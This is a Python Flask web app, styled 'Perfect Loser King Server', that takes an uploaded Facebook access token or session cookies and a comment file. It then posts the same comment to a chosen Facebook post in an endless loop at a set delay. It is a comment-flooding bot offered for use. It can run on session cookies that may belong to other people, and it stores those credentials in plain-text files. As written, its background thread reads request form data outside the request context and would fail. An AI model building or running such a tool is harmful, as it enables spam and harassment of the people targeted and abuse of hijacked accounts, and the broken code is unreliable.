from flask import Flask, request, render_template_string
import os
import threading
import time
import requests

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
COOKIES_FILE = os.path.join(DATA_DIR, "cookies.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comments.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

def save_data(token, cookies, comment_text, delay):
    if token:
        with open(TOKEN_FILE, "w") as f:
            f.write(token.strip())
    if cookies:
        with open(COOKIES_FILE, "w") as f:
            f.write(cookies.strip())
    with open(COMMENT_FILE, "w") as f:
        f.write(comment_text.strip())
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

def extract_post_id(url):
    """ Extracts the post ID from any Facebook post URL """
    if "posts/" in url:
        return url.split("posts/")[-1].split("/")[0]
    elif "pfbid" in url:
        return url.split("/")[-1].split("?")[0]
    return None

def send_comments():
    try:
        with open(COMMENT_FILE, "r") as f:
            comment_text = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())
        
        token, cookies = None, None
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, "r") as f:
                token = f.read().strip()
        if os.path.exists(COOKIES_FILE):
            with open(COOKIES_FILE, "r") as f:
                cookies = f.read().strip()
        
        if not comment_text:
            print("[!] Missing comment text.")
            return

        url = request.form.get("post_url")
        post_id = extract_post_id(url)
        if not post_id:
            print("[!] Invalid Facebook Post URL.")
            return

        fb_url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
        headers = {'User-Agent': 'Mozilla/5.0'}
        payload = {'message': comment_text}

        if token:
            payload['access_token'] = token
        elif cookies:
            headers['Cookie'] = cookies
        else:
            print("[!] No authentication method found.")
            return

        while True:
            response = requests.post(fb_url, data=payload, headers=headers)
            if response.ok:
                print(f"[+] Comment sent: {comment_text}")
            else:
                print(f"[x] Failed: {response.status_code} {response.text}")

            time.sleep(delay)

    except Exception as e:
        print(f"[!] Error: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Perfect Loser King Server</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { background: #111; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
        h1 { color: #00ffcc; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input, button { padding: 10px; border-radius: 5px; background: #222; color: white; margin-bottom: 10px; width: 100%; }
        button { background-color: #00ffcc; color: black; cursor: pointer; }
        button:hover { background-color: #00cc99; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Perfect Loser King Server</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label>Enter Facebook Post URL:</label>
            <input type="text" name="post_url" required>

            <label>Upload Access Token (token.txt):</label>
            <input type="file" name="token_file">

            <label>Upload Cookies File (cookies.txt):</label>
            <input type="file" name="cookies_file">

            <label>Upload Comment Text File (comments.txt):</label>
            <input type="file" name="comments_file" required>

            <label>Delay in Seconds:</label>
            <input type="number" name="delay" value="5" min="1">

            <button type="submit">Submit & Start Commenting</button>
        </form>
        <footer>© 2025 Perfect Loser King Server. All Rights Reserved.</footer>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token_file = request.files.get("token_file")
        cookies_file = request.files.get("cookies_file")
        comments_file = request.files.get("comments_file")
        delay = int(request.form.get("delay", 5))

        token, cookies, comment_text = None, None, None
        if token_file:
            token = token_file.read().decode().strip()
        if cookies_file:
            cookies = cookies_file.read().decode().strip()
        if comments_file:
            comment_text = comments_file.read().decode().strip()

        if comment_text:
            save_data(token, cookies, comment_text, delay)
            threading.Thread(target=send_comments, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
